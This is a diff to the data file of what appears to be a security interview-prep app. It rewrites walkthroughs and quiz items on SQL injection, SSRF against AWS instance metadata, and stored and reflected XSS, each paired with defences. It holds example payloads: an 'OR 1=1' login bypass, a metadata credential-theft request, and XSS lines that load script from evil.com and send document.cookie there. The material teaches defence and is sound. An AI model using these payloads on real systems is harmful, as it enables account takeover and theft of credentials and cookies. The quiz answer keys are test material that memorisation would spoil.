+        "whatIsHappeningTitle": "Step 2: String Concatenation Failure",
+        "whatIsHappeningText": "Step 2: Flaw: String concatenation merges user input into the SQL command tree, causing the SQL engine to execute attacker logic.",
         "terms": [
           {
-            "term": "SQL AST Mutation",
-            "definition": "Attacker input breaking syntax boundaries to alter the compiled query execution tree."
+            "term": "Dynamic SQL Construction",
+            "definition": "Building SQL commands at runtime by concatenating user strings directly into query text."
+          },
+          {
+            "term": "Abstract Syntax Tree (AST) Manipulation",
+            "definition": "Injecting tokens that alter the database parser's syntactic tree from data into boolean command logic."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "In the vulnerable application code: \"SELECT * FROM users WHERE user = '\" + input + \"' AND pass = '\" + pass + \"'\". The database parser receives the concatenated string as a single unified text stream. It interprets OR '1'='1' as executable boolean logic, evaluates the query as unconditionally true, and logs the attacker in as the first user: Admin.",
+        "whyItMatters": "Demonstrates how string concatenation causes the database engine to treat untrusted data as executable instructions.",
+        "securityVerdict": "Catastrophic failure: SQL execution tree hijacked by user input.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "PostgreSQL Wire Protocol",
+          "method": "Raw Text Query Execution",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Query-Mode: Simple Query (Text Concatenation)",
+            "SQL: SELECT * FROM users WHERE user = 'admin' OR '1'='1' -- AND pass = '...'"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy String Concatenation validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "Query returns user record: { id: 1, username: 'admin', role: 'superuser' }",
+          "securityAction": "Database executes altered syntax tree; authentication bypassed without password verification.",
+          "statusBadge": "AUTHENTICATION BYPASS"
         }
       },
       {
         "id": 3,
-        "label": "Pre-compiled Parameterization",
-        "from": "attacker_input",
-        "to": "prepared_stmt",
-        "packet": "SELECT * FROM users WHERE user = ? [Param: admin' OR 1=1]",
-        "caption": "Step 3: Prepared statements send SQL code structure to the DB first. The database compiles the Abstract Syntax Tree (AST) before user parameters are received.",
+        "label": "Parameterized Query / Prepared Statement Defense",
+        "from": "web_server",
+        "to": "database",
+        "packet": "PREPARE stmt FROM 'SELECT * FROM users WHERE user = ? AND pass = ?'; EXECUTE stmt USING input;",
+        "caption": "Step 3: Definitive fix: Prepared statements compile the SQL query syntax tree FIRST, treating user input strictly as literal data.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 3: Pre-compiled Parameterization",
-        "whatIsHappeningText": "Step 3: Prepared statements send SQL code structure to the DB first. The database compiles the Abstract Syntax Tree (AST) before user parameters are received.",
+        "whatIsHappeningTitle": "Step 3: Prepared Statement Defense",
+        "whatIsHappeningText": "Step 3: Definitive fix: Prepared statements compile the SQL query syntax tree FIRST, treating user input strictly as literal data.",
         "terms": [
           {
-            "term": "Parameterized Query",
-            "definition": "Separates query structure compilation from literal data parameter values."
+            "term": "Prepared Statement / Parameterized Query",
+            "definition": "Pre-compiling the SQL query structure in the database engine before binding user parameters as pure data literals."
+          },
+          {
+            "term": "Binary Parameter Protocol",
+            "definition": "Transmitting query parameters separately in binary format across the network wire, completely segregated from SQL command text."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "Parameterized queries split the operation into two distinct phases: 1) The database engine parses and compiles the SQL query structure using placeholders (? or $1), creating an immutable Abstract Syntax Tree; 2) The user input is transmitted separately as pure literal values. Even if the input contains quotes or SQL commands, the engine treats it purely as literal text.",
+        "whyItMatters": "Completely eliminates SQL injection at the mathematical compiler level, regardless of payload complexity.",
+        "securityVerdict": "Data and code contexts strictly separated; SQL injection rendered impossible.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "PostgreSQL Extended Query Protocol",
+          "method": "Parse -> Bind -> Execute",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Phase-1-Parse: SELECT * FROM users WHERE user = $1",
+            "Phase-2-Bind: Parameter $1 = \"admin' OR '1'='1' --\" (Type: text)"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Prepared Statement\" }",
-          "securityAction": "Backend service Prepared Statement enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "Database treats string \"admin' OR '1'='1' --\" as a literal username. Zero users found.",
+          "securityAction": "Database compares parameter value strictly as string literal; zero syntax tree alteration.",
+          "statusBadge": "SQLI IMMUNITY"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "prepared_stmt",
-        "to": "secure_db",
-        "packet": "Executed as literal string: 0 syntax changes",
-        "caption": "Step 4: Interview line: \"Parameterized queries stop SQL Injection because the database compiles the query syntax tree beforehand — user input is transmitted over the wire as literal data parameters, making syntax mutation mathematically impossible.\"",
+        "from": "database",
+        "to": "web_server",
+        "packet": "Result: 0 records found (Treated as literal username) -> 401 Invalid Credentials",
+        "caption": "Step 4: Interview line: \"Parameterized queries eliminate SQL injection not by escaping strings, but by pre-compiling the Abstract Syntax Tree so untrusted input is treated strictly as data literals, never executable code.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"Parameterized queries stop SQL Injection because the database compiles the query syntax tree beforehand — user input is transmitted over the wire as literal data parameters, making syntax mutation mathematically impossible.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"Parameterized queries eliminate SQL injection not by escaping strings, but by pre-compiling the Abstract Syntax Tree so untrusted input is treated strictly as data literals, never executable code.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "Escaping vs Parameterization",
+            "definition": "Escaping attempts to sanitize strings (prone to bypasses); parameterization architecturally segregates data from code."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "ORM Raw Query Pitfall",
+            "definition": "Vulnerabilities introduced when developers use ORM raw query methods (e.g. sequelize.query()) with string interpolation."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "Senior candidates emphasize the fundamental computer science principle: Parameterization solves injection not through blacklist filtering or regex escaping (which frequently fail against encoding tricks or non-standard charsets), but by compiling the execution plan first. When using ORMs, developers must avoid raw query interpolation (e.g. Prisma.$queryRawUnsafe or Sequelize.literal).",
+        "whyItMatters": "Explaining the AST pre-compilation model demonstrates deep engineering maturity over superficial tool usage.",
+        "securityVerdict": "Definitive architectural defense: code and data separation completely eliminates SQLi.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "PostgreSQL Safe Execution",
+          "method": "Result Evaluation",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Query-Status: Executed Safely",
+            "Rows-Returned: 0"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"Always use parameterized queries or trusted ORMs. Input validation sho...\" }",
-          "securityAction": "Final defensive control verified: Database Engine secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "No user matches literal string \"admin' OR '1'='1' --\". Authentication rejected with 401.",
+          "securityAction": "Application returns 401 Unauthorized; injection attempt logged into security event pipeline.",
+          "statusBadge": "SAFE REJECTION"
         }
       }
     ],
@@ -3269,15 +3305,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Advanced",
     "interviewTakeaway": "Always use parameterized queries or trusted ORMs. Input validation should be used for business logic correctness, but Parameterization is the non-negotiable security defense against SQLi.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"How does SQL Injection work and why are Parameterized Queries the definitive defense?\"?",
+      "question": "Why do Parameterized Queries (Prepared Statements) provide definitive protection against SQL Injection where regex sanitization and character escaping often fail?",
       "options": [
-        "Executed as literal string: 0 syntax changes",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Because Prepared Statements pre-compile the SQL Abstract Syntax Tree (AST) first, ensuring the database engine treats all user inputs strictly as literal data parameters that cannot alter query command structure",
+        "Because Prepared Statements automatically encrypt the entire database using AES-256",
+        "Because Prepared Statements convert all SQL queries into flat JSON files stored in memory",
+        "Because Prepared Statements require users to submit their database passwords via two-factor authentication"
       ],
       "correctIndex": 0,
-      "explanation": "Always use parameterized queries or trusted ORMs. Input validation should be used for business logic correctness, but Parameterization is the non-negotiable security defense against SQLi."
+      "explanation": "Prepared statements work by having the database engine parse and compile the SQL query structure with placeholders first. Untrusted user input is bound separately as pure data literals, making it mathematically impossible for the input to alter the syntax tree or inject executable commands."
     }
   },
   {
@@ -3315,144 +3351,142 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "SSRF Webhook Injected",
+        "label": "SSRF URL Fetch Injection",
         "from": "attacker",
-        "to": "vulnerable_server",
-        "packet": "POST /fetch-url?url=http://169.254.169.254/latest/meta-data/",
-        "caption": "Step 1: Attacker forces the backend server to make an outbound HTTP request targeting the internal cloud metadata IP address (169.254.169.254).",
+        "to": "app_server",
+        "packet": "POST /api/webhook/test { url: 'http://169.254.169.254/latest/meta-data/' }",
+        "caption": "Step 1: Attacker exploits a server-side URL fetch feature (webhook tester, avatar download) targeting the internal cloud metadata IP.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 1: SSRF Webhook Injected",
-        "whatIsHappeningText": "Step 1: Attacker forces the backend server to make an outbound HTTP request targeting the internal cloud metadata IP address (169.254.169.254).",
+        "whatIsHappeningTitle": "Step 1: SSRF URL Fetch Injection",
+        "whatIsHappeningText": "Step 1: Attacker exploits a server-side URL fetch feature (webhook tester, avatar download) targeting the internal cloud metadata IP.",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "SSRF (Server-Side Request Forgery)",
+            "definition": "Vulnerability where an attacker induces a server application to make HTTP requests to unintended internal destinations."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "Cloud Metadata Service (IMDS)",
+            "definition": "A link-local IP (169.254.169.254) accessible by cloud instances (AWS, GCP, Azure) to query instance metadata and IAM credentials."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "Web applications often provide features that fetch remote URLs (e.g. webhook delivery, PDF generation, image import). An attacker provides the link-local cloud metadata address: http://169.254.169.254/latest/meta-data/iam/security-credentials/. Because the request originates from the trusted cloud instance itself, local network firewalls permit the outbound traffic.",
+        "whyItMatters": "Direct gateway to stealing temporary IAM role credentials and taking over the entire cloud infrastructure.",
+        "securityVerdict": "Server-side fetch endpoint targeted with cloud metadata link-local address.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "HTTP/2 REST API",
+          "method": "POST /api/v1/webhooks/test",
           "headers": [
-            "Host: api.server.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Content-Type: application/json",
+            "Host: cloud-app.com"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"Vulnerable App Server\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to Vulnerable App Server.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role\"}",
+          "securityAction": "Application server prepares to make server-side HTTP GET request to client-supplied URL.",
+          "statusBadge": "SSRF DISPATCHED"
         }
       },
       {
         "id": 2,
-        "label": "IMDSv1 Token Theft",
-        "from": "vulnerable_server",
-        "to": "imds_v1",
-        "packet": "GET /iam/security-credentials/EC2Role -> Stolen AWS Keys",
-        "caption": "Step 2: Under legacy IMDSv1, a simple GET request without headers returns temporary IAM credentials, leading to total cloud account compromise.",
+        "label": "IMDSv1 Credential Theft Failure",
+        "from": "app_server",
+        "to": "imds",
+        "packet": "GET http://169.254.169.254/latest/meta-data/... (Plain GET succeeds in IMDSv1)",
+        "caption": "Step 2: Flaw: Under legacy IMDSv1, a simple HTTP GET is sufficient to steal temporary AWS IAM credentials, leading to total cloud takeover.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 2: IMDSv1 Token Theft",
-        "whatIsHappeningText": "Step 2: Under legacy IMDSv1, a simple GET request without headers returns temporary IAM credentials, leading to total cloud account compromise.",
+        "whatIsHappeningTitle": "Step 2: IMDSv1 Credential Theft Failure",
+        "whatIsHappeningText": "Step 2: Flaw: Under legacy IMDSv1, a simple HTTP GET is sufficient to steal temporary AWS IAM credentials, leading to total cloud takeover.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "AWS IMDSv1",
+            "definition": "Legacy metadata service allowing simple unauthenticated GET requests to retrieve IAM role access tokens."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "Capital One Breach Vector",
+            "definition": "Famous 2019 cloud breach where an SSRF vulnerability against IMDSv1 resulted in the theft of 100M customer records."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "In AWS IMDSv1, any process that can dispatch an HTTP GET request to 169.254.169.254 can extract the AccessKeyId, SecretAccessKey, and Token for the EC2 instance's attached IAM role. The server returns the credentials directly to the attacker's HTTP response stream, resulting in complete cloud environment compromise.",
+        "whyItMatters": "Exposes cloud-wide administrative permissions from a single application-level SSRF bug.",
+        "securityVerdict": "Catastrophic credential theft: IMDSv1 allows unauthenticated GET credential extraction.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "HTTP/1.1 Link-Local Metadata (IMDSv1)",
+          "method": "GET /latest/meta-data/iam/security-credentials/app-role",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Host: 169.254.169.254"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy Vulnerable App Server validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "{ \"AccessKeyId\": \"ASIA2...\", \"SecretAccessKey\": \"9kL...\", \"Token\": \"FwoGZ...\" }",
+          "securityAction": "Vulnerable IMDSv1 returns full cloud IAM credentials over unauthenticated GET request.",
+          "statusBadge": "CREDENTIALS STOLEN"
         }
       },
       {
         "id": 3,
-        "label": "IMDSv2 Session Token Challenge",
-        "from": "vulnerable_server",
-        "to": "imds_v2",
-        "packet": "PUT /api/token [X-aws-ec2-metadata-token-ttl-seconds: 21600]",
-        "caption": "Step 3: Defense: IMDSv2 requires a custom PUT request with special headers to obtain a signed session token first.",
+        "label": "IMDSv2 Session Token Defense",
+        "from": "app_server",
+        "to": "imds",
+        "packet": "PUT /latest/api/token (Header: X-aws-ec2-metadata-token-ttl-seconds: 21600)",
+        "caption": "Step 3: IMDSv2 defense: Mandates a PUT request with custom header to acquire a session token; SSRF cannot forge custom PUT headers.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 3: IMDSv2 Session Token Challenge",
-        "whatIsHappeningText": "Step 3: Defense: IMDSv2 requires a custom PUT request with special headers to obtain a signed session token first.",
+        "whatIsHappeningTitle": "Step 3: IMDSv2 Session Token Defense",
+        "whatIsHappeningText": "Step 3: IMDSv2 defense: Mandates a PUT request with custom header to acquire a session token; SSRF cannot forge custom PUT headers.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "AWS IMDSv2",
+            "definition": "Session-oriented metadata service requiring a PUT request with custom TTL headers to acquire a session token before metadata access."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "Hop Limit Restriction",
+            "definition": "Setting IP packet Time-To-Live (TTL) to 1, preventing metadata responses from traversing network routers or proxies."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "AWS IMDSv2 introduces session-oriented defense: callers must first dispatch an HTTP PUT request with the header 'X-aws-ec2-metadata-token-ttl-seconds: 21600' to acquire a cryptographic session token. Because standard application SSRF vulnerabilities (e.g. image loaders, webhooks) can only issue GET requests and cannot inject custom PUT headers, attackers cannot obtain the token.",
+        "whyItMatters": "Neutralizes the vast majority of real-world cloud metadata SSRF exploitation vectors.",
+        "securityVerdict": "Session token mandate and hop-limit restriction block unauthorized SSRF retrieval.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "AWS IMDSv2 Session Protocol",
+          "method": "PUT /latest/api/token",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "X-aws-ec2-metadata-token-ttl-seconds: 21600",
+            "Host: 169.254.169.254"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Cloud Metadata (IMDSv1)\" }",
-          "securityAction": "Backend service Cloud Metadata (IMDSv1) enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "Response: AQAAAHu8... (Secret Session Token valid for 6 hours)",
+          "securityAction": "Metadata service generates session token bound strictly to calling instance process.",
+          "statusBadge": "IMDSv2 TOKEN ACTIVE"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "imds_v2",
-        "to": "vulnerable_server",
-        "packet": "SSRF Simple GET blocked: 401 Unauthorized",
-        "caption": "Step 4: Interview line: \"SSRF exploits server trust to reach internal networks — enforce IMDSv2 which blocks simple HTTP GET attacks by requiring a custom PUT session token, alongside strict DNS resolution and egress firewalls.\"",
+        "from": "app_server",
+        "to": "attacker",
+        "packet": "Defense: Enforce IMDSv2 (Hop Limit=1) + DNS Resolution Egress Allowlist",
+        "caption": "Step 4: Interview line: \"Defending against SSRF requires defense-in-depth: enforce AWS IMDSv2 with hop limit=1, resolve and validate IPs against private ranges (RFC 1918 + link-local) before connecting, and disable HTTP redirects.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"SSRF exploits server trust to reach internal networks — enforce IMDSv2 which blocks simple HTTP GET attacks by requiring a custom PUT session token, alongside strict DNS resolution and egress firewalls.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"Defending against SSRF requires defense-in-depth: enforce AWS IMDSv2 with hop limit=1, resolve and validate IPs against private ranges (RFC 1918 + link-local) before connecting, and disable HTTP redirects.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "RFC 1918 Private Ranges",
+            "definition": "Non-routable IP address blocks (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) that must be blocked in SSRF egress validators."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "DNS Pinning / TOCTOU Defense",
+            "definition": "Resolving domain DNS once, validating that the resolved IP is public, and connecting directly to that resolved IP to prevent DNS rebinding."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "Senior candidates present a complete SSRF defense architecture: 1) Enforce IMDSv2 with hop limit=1 in cloud configurations; 2) In application code, resolve DNS, inspect the resolved IP, and reject all RFC 1918 private IPs, loopbacks (127.0.0.1), and link-local ranges (169.254.0.0/16); 3) Pin the resolved IP to prevent DNS rebinding (TOCTOU); and 4) Disable following HTTP redirects.",
+        "whyItMatters": "Protects both cloud metadata endpoints and internal microservice service-mesh backends from SSRF.",
+        "securityVerdict": "Defense-in-depth egress perimeter active against SSRF and cloud metadata theft.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "SSRF Egress Guard Pipeline",
+          "method": "Pre-Flight IP Validation",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Resolved-IP: 169.254.169.254",
+            "Validation-Result: REJECT (Link-Local Range)"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"Always mandate IMDSv2 with hop limit = 1 on all cloud instances. For a...\" }",
-          "securityAction": "Final defensive control verified: Hardened IMDSv2 secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "❌ Outbound Request Aborted: Target IP matches prohibited link-local cloud metadata range.",
+          "securityAction": "Egress firewall drops connection before TCP handshake; logs alert to SIEM.",
+          "statusBadge": "SSRF NEUTRALIZED"
         }
       }
     ],
@@ -3490,15 +3524,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Advanced",
     "interviewTakeaway": "Always mandate IMDSv2 with hop limit = 1 on all cloud instances. For applications fetching user URLs, validate and resolve domain names, verify resolved IP addresses are not private/loopback (RFC 1918), and block DNS rebinding.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"How does Server-Side Request Forgery (SSRF) work and how do you protect cloud metadata endpoints (IMDSv2)?\"?",
+      "question": "How does AWS IMDSv2 protect EC2 instance metadata from Server-Side Request Forgery (SSRF) compared to legacy IMDSv1?",
       "options": [
-        "SSRF Simple GET blocked: 401 Unauthorized",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "IMDSv2 requires a session-oriented PUT request with a mandatory 'X-aws-ec2-metadata-token-ttl-seconds' header to obtain a token, which standard SSRF GET-based fetch vulnerabilities cannot forge",
+        "IMDSv2 disables metadata access on all weekends and holidays",
+        "IMDSv2 sends instance metadata in unencrypted emails to the account owner",
+        "IMDSv2 replaces the 169.254.169.254 link-local IP with a public Google DNS address"
       ],
       "correctIndex": 0,
-      "explanation": "Always mandate IMDSv2 with hop limit = 1 on all cloud instances. For applications fetching user URLs, validate and resolve domain names, verify resolved IP addresses are not private/loopback (RFC 1918), and block DNS rebinding."
+      "explanation": "Legacy IMDSv1 allowed credential extraction using simple HTTP GET requests. IMDSv2 requires a pre-flight PUT request with a custom header ('X-aws-ec2-metadata-token-ttl-seconds') to retrieve a session token. Standard SSRF vulnerabilities (e.g. in image uploaders or webhook dispatchers) cannot forge custom PUT headers."
     }
   },
   {
@@ -3536,132 +3570,143 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Stored & Reflected Vectors",
-        "from": "xss_source",
-        "to": "storage_engine",
-        "packet": "Stored in Database or reflected in URL query parameter",
-        "caption": "Step 1: Stored XSS persists in databases (comments/profiles); Reflected XSS reflects immediately off server responses via query params.",
+        "label": "Stored XSS Injection (Persistent in DB)",
+        "from": "attacker",
+        "to": "database",
+        "packet": "POST /comments { text: \"<script src='https://evil.com/hook.js'></script>\" }",
+        "caption": "Step 1: Stored XSS: Malicious payload is permanently saved in the database, executing automatically whenever ANY user views the page.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 1: Stored & Reflected Vectors",
-        "whatIsHappeningText": "Step 1: Stored XSS persists in databases (comments/profiles); Reflected XSS reflects immediately off server responses via query params.",
+        "whatIsHappeningTitle": "Step 1: Stored XSS Injection",
+        "whatIsHappeningText": "Step 1: Stored XSS: Malicious payload is permanently saved in the database, executing automatically whenever ANY user views the page.",
         "terms": [
           {
-            "term": "Stored XSS",
-            "definition": "Malicious script persistently stored in database and executed when victims view page."
+            "term": "Stored (Persistent) XSS",
+            "definition": "An XSS attack where the malicious script is stored persistently in the database, filesystem, or forum post."
+          },
+          {
+            "term": "Execution Sinks",
+            "definition": "DOM functions (e.g. innerHTML, eval(), document.write) that parse strings into executable markup."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "In Stored XSS, the attacker submits unvalidated script tags into a persistent data store (e.g. customer reviews or profile names). When other users, administrators, or support staff navigate to the page, the application retrieves the raw payload from the database and renders it directly into the HTML DOM without encoding, triggering automatic script execution.",
+        "whyItMatters": "Most dangerous type of XSS because it requires zero user interaction and infects all visitors automatically.",
+        "securityVerdict": "High-impact persistent payload stored in application database.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "HTTP/2 REST API",
+          "method": "POST /api/v1/comments",
           "headers": [
-            "Host: api.cross.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Content-Type: application/json",
+            "Host: community-app.com"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"Database / URL Reflection\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to Database / URL Reflection.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "{\"comment\": \"Great article! <script src='https://evil.com/hook.js'></script>\"}",
+          "securityAction": "Vulnerable backend stores unescaped HTML string directly into comments database table.",
+          "statusBadge": "STORED IN DB"
         }
       },
       {
         "id": 2,
-        "label": "DOM-Based Sinks",
-        "from": "xss_source",
-        "to": "dom_sink",
-        "packet": "location.hash -> innerHTML (Client-Side Only)",
-        "caption": "Step 2: DOM XSS executes entirely inside client JavaScript by taking input from Sources (location.search) and passing to Sinks (innerHTML, eval).",
+        "label": "Reflected XSS Execution (Immediate Reflection)",
+        "from": "attacker",
+        "to": "victim",
+        "packet": "Link: https://app.com/search?q=<script>fetch('//evil.com?c='+document.cookie)</script>",
+        "caption": "Step 2: Reflected XSS: Payload in the URL query string is immediately echoed back in the server's HTML response without escaping.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 2: DOM-Based Sinks",
-        "whatIsHappeningText": "Step 2: DOM XSS executes entirely inside client JavaScript by taking input from Sources (location.search) and passing to Sinks (innerHTML, eval).",
+        "whatIsHappeningTitle": "Step 2: Reflected XSS Execution",
+        "whatIsHappeningText": "Step 2: Reflected XSS: Payload in the URL query string is immediately echoed back in the server's HTML response without escaping.",
         "terms": [
           {
-            "term": "DOM XSS",
-            "definition": "Vulnerability where client script takes data from Source and passes to dangerous Sink."
+            "term": "Reflected (Non-Persistent) XSS",
+            "definition": "An attack where malicious input is sent in an HTTP request and reflected directly into the immediate response."
+          },
+          {
+            "term": "Phishing Lure Delivery",
+            "definition": "Social engineering delivery of weaponized URLs to victims via email, SMS, or third-party chat."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "In Reflected XSS, the server takes an input parameter (e.g. ?q=search_term) and interpolates it into the response HTML template: '<h1>Results for: <script>...</script></h1>'. The script executes in the victim's browser context the moment they click the attacker's weaponized link.",
+        "whyItMatters": "Allows targeted attacks, credential theft, and session hijacking when delivered via spear-phishing campaigns.",
+        "securityVerdict": "Unencoded server-side reflection allows script execution in victim browser.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "HTTP/2 HTML Response",
